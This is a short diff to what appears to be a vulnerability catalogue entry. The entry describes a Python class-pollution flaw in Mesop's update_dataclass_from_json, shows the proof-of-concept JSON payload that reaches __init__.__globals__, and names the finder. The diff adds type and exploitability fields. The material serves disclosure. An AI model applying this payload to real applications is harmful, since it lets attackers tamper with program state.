@@ -10,6 +10,8 @@
 + Payload: ```mesop.dataclass_utils.dataclass_utils.update_dataclass_from_json(obj, '{"__init__": {"__globals__": {"__name__": "polluted"}}}')```
 + Foundby: BlackPyrl
 + Report: Pending
++ Type: App
++ Exploitability: High
 
 ### Library
 
